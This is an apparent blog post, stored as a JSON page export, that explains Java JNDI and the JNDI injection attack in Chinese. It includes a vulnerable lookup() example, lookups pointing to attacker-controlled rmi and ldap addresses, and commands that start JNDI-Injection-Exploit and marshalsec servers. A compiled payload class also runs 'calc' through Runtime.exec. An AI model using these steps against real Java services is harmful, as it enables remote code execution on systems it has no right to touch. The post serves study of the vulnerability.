{"title":"Java-JNDI","uid":"35d0606ce30ad44ccc65a3edcc603a2c","slug":"Java-JNDI","date":"2025-05-17T07:08:06.640Z","updated":"2025-05-17T07:44:19.355Z","comments":true,"path":"api/articles/Java-JNDI.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/4ed9d560-46f5-46ae-bf0a-04336ba9eb7b.jpg","content":"<h1 id=\"Java-JNDI\"><a href=\"#Java-JNDI\" class=\"headerlink\" title=\"Java-JNDI\"></a>Java-JNDI</h1><h2 id=\"JNDI-是什么\"><a href=\"#JNDI-是什么\" class=\"headerlink\" title=\"JNDI 是什么\"></a>JNDI 是什么</h2><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。</p>\n<p>JNDI 提供统一的客户端 API，通过不同的 JNDI 服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p>\n<p>通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的命令服务和目录服务，如下图。</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png\"></p>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>LDAP</td>\n<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>\n</tr>\n<tr>\n<td>RMI</td>\n<td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>\n</tr>\n<tr>\n<td>DNS</td>\n<td>域名服务</td>\n</tr>\n<tr>\n<td>CORBA</td>\n<td>公共对象请求代理体系结构</td>\n</tr>\n</tbody></table>\n<h2 id=\"JNDI-注入原理分析\"><a href=\"#JNDI-注入原理分析\" class=\"headerlink\" title=\"JNDI 注入原理分析\"></a>JNDI 注入原理分析</h2><p>JNDI 注入，即当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数被外部攻击者可控，攻击者就可以将恶意的 url 传入参数，以此劫持被攻击的 Java 客户端的 JNDI 请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意 Java 对象载荷（reference 实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F286C4\">package</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">org.example</span><span style=\"color: #F6F6F4\">;</span></span>\n<span class=\"line\"><span style=\"color: #F286C4\">import</span><span style=\"color: #F6F6F4\"> javax.naming.InitialContext;</span></span>\n<span class=\"line\"><span style=\"color: #F286C4\">import</span><span style=\"color: #F6F6F4\"> javax.naming.NamingException;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\"> </span></span>\n<span class=\"line\"><span style=\"color: #F286C4\">public</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">class</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">jndi</span><span style=\"color: #F6F6F4\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">    </span><span style=\"color: #F286C4\">public</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">static</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1; font-style: italic\">void</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">main</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #97E1F1; font-style: italic\">String</span><span style=\"color: #F6F6F4\">[] </span><span style=\"color: #FFB86C; font-style: italic\">args</span><span style=\"color: #F6F6F4\">) </span><span style=\"color: #F286C4\">throws</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1; font-style: italic\">NamingException</span><span style=\"color: #F6F6F4\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">        </span><span style=\"color: #97E1F1; font-style: italic\">String</span><span style=\"color: #F6F6F4\"> uri </span><span style=\"color: #F286C4\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">rmi://127.0.0.1:1099/Exploit</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\">;    </span><span style=\"color: #7B7F8B\">// 指定查找的 uri 变量</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">        </span><span style=\"color: #97E1F1; font-style: italic\">InitialContext</span><span style=\"color: #F6F6F4\"> initialContext </span><span style=\"color: #F286C4\">=</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4; font-weight: bold\">new</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">InitialContext</span><span style=\"color: #F6F6F4\">();</span><span style=\"color: #7B7F8B\">// 得到初始目录环境的一个引用</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">        initialContext.</span><span style=\"color: #62E884\">lookup</span><span style=\"color: #F6F6F4\">(uri); </span><span style=\"color: #7B7F8B\">// 获取指定的远程对象</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">&#125;</span></span></code></pre></div><p>代码中定义了 uri 变量，uri 变量可控，并定义了一个 rmi 协议服务， rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 为攻击者控制的链接，最后使用 lookup () 函数进行远程获取 Exploit 类（Exploit 类名为攻击者定义，不唯一），并执行它。</p>\n<p><strong>JNDI 远程调用：JNDI-Injection</strong></p>\n<p>1，使用远程调用（默认端口 1389）</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F286C4; font-weight: bold\">new</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">InitialContext</span><span style=\"color: #F6F6F4\">().</span><span style=\"color: #62E884\">lookup</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">ldap://xx.xx.xx.xx:1389/Test</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\">);</span></span></code></pre></div><p>2，利用工具生成调用地址</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F6F6F4\">java </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">jar JNDI</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">Injection</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">Exploit</span><span style=\"color: #F286C4\">-</span><span style=\"color: #BF9EEE\">1.0</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">SNAPSHOT</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">all.jar </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">C </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">calc</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">-</span><span style=\"color: #97E1F1; font-style: italic\">A</span><span style=\"color: #F6F6F4\"> xx.xx.xx.xx</span></span></code></pre></div><p><strong>JNDI 远程调用 - marshalsec</strong></p>\n<p>2，利用工具生成调用地址</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F6F6F4\">java </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">jar JNDI</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">Injection</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">Exploit</span><span style=\"color: #F286C4\">-</span><span style=\"color: #BF9EEE\">1.0</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">SNAPSHOT</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">all.jar </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">C </span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">calc</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">-</span><span style=\"color: #97E1F1; font-style: italic\">A</span><span style=\"color: #F6F6F4\"> xx.xx.xx.xx</span></span></code></pre></div><p><strong>JNDI 远程调用 - marshalsec</strong></p>\n<p>1，使用远程端口 (默认端口 1389)</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F286C4; font-weight: bold\">new</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">InitialContext</span><span style=\"color: #F6F6F4\">().</span><span style=\"color: #62E884\">lookup</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">ldap://xx.xx.xx.xx:1389/Test</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\">);</span></span></code></pre></div><p>2，编译对象</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F6F6F4\">javac Test.java  </span><span style=\"color: #7B7F8B\">//编译为.class</span></span></code></pre></div><div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #7B7F8B\">//Test.java</span></span>\n<span class=\"line\"><span style=\"color: #F286C4\">public</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #F286C4\">class</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1\">Calculator</span><span style=\"color: #F6F6F4\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">    </span><span style=\"color: #F286C4\">public</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #62E884\">Calculator</span><span style=\"color: #F6F6F4\">() </span><span style=\"color: #F286C4\">throws</span><span style=\"color: #F6F6F4\"> </span><span style=\"color: #97E1F1; font-style: italic\">Exception</span><span style=\"color: #F6F6F4\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">        Runtime.</span><span style=\"color: #62E884\">getRuntime</span><span style=\"color: #F6F6F4\">().</span><span style=\"color: #62E884\">exec</span><span style=\"color: #F6F6F4\">(</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #E7EE98\">calc</span><span style=\"color: #DEE492\">&quot;</span><span style=\"color: #F6F6F4\">);</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">&#125;</span></span></code></pre></div><p>3，使用工具生成调用协议（rmi，ldap）</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki dracula-soft\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #F6F6F4\">java </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">cp marshalsec</span><span style=\"color: #F286C4\">-</span><span style=\"color: #BF9EEE\">0.0</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #EE6666; font-style: italic; text-decoration: underline\">3</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">SNAPSHOT</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">all.jar </span><span style=\"color: #97E1F1; font-style: italic\">marshalsec</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #97E1F1; font-style: italic\">jndi</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #97E1F1; font-style: italic\">LADPRefServeer</span><span style=\"color: #F6F6F4\"> http</span><span style=\"color: #F286C4\">:</span><span style=\"color: #7B7F8B\">//0.0.0.0/Test</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">或者</span></span>\n<span class=\"line\"><span style=\"color: #F6F6F4\">java </span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">cp marshalsec</span><span style=\"color: #F286C4\">-</span><span style=\"color: #BF9EEE\">0.0</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #EE6666; font-style: italic; text-decoration: underline\">3</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">SNAPSHOT</span><span style=\"color: #F286C4\">-</span><span style=\"color: #F6F6F4\">all.jar </span><span style=\"color: #97E1F1; font-style: italic\">marshalsec</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #97E1F1; font-style: italic\">jndi</span><span style=\"color: #F6F6F4\">.</span><span style=\"color: #97E1F1; font-style: italic\">RMIRefServeer</span><span style=\"color: #F6F6F4\"> http</span><span style=\"color: #F286C4\">:</span><span style=\"color: #7B7F8B\">//0.0.0.0/Test</span></span></code></pre></div><p>注意：不同 JDK 版本中 JNDI 注入存在的限制及绕过方法</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5-1024x365.png\"></p>\n","text":"Java-JNDIJNDI 是什么JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 J...","permalink":"/post/Java-JNDI","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"Java基础知识","slug":"Java基础知识","count":5,"path":"api/categories/Java基础知识.json"}],"tags":[{"name":"Java基础","slug":"Java基础","count":5,"path":"api/tags/Java基础.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Java-JNDI\"><span class=\"toc-text\">Java-JNDI</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JNDI-%E6%98%AF%E4%BB%80%E4%B9%88\"><span class=\"toc-text\">JNDI 是什么</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JNDI-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90\"><span class=\"toc-text\">JNDI 注入原理分析</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Java安全-RCE执行,JNDI注入","uid":"405d1bcee462f9653e9b6caa35fc018c","slug":"Java安全-RCE执行-JNDI注入","date":"2025-05-17T07:15:45.005Z","updated":"2025-05-17T12:08:47.864Z","comments":true,"path":"api/articles/Java安全-RCE执行-JNDI注入.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/1bd6f8ce-0ae6-4e42-8a66-2563b9971118.jpg","text":"Java安全-RCE执行,JNDI注入Java 安全 - RCE 执行 - 5 大类函数调用-Groovy -RuntimeExec -ProcessImpl ...","permalink":"/post/Java安全-RCE执行-JNDI注入","photos":[],"count_time":{"symbolsCount":925,"symbolsTime":"1 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/tags/Java安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"JavaEE-序列化和反序列化","uid":"83b6c2550820553f88f46482ca935e4b","slug":"Java-序列化与反序列化","date":"2025-05-17T07:05:36.238Z","updated":"2025-05-17T07:44:26.419Z","comments":true,"path":"api/articles/Java-序列化与反序列化.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/5a2feebf-6337-4e42-bbe7-5fe43ef7aca4.jpg","text":"Java-序列化与反序列化序列化和反序列化的应用： 两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上...","permalink":"/post/Java-序列化与反序列化","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[{"name":"Java基础知识","slug":"Java基础知识","count":5,"path":"api/categories/Java基础知识.json"}],"tags":[{"name":"Java基础","slug":"Java基础","count":5,"path":"api/tags/Java基础.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}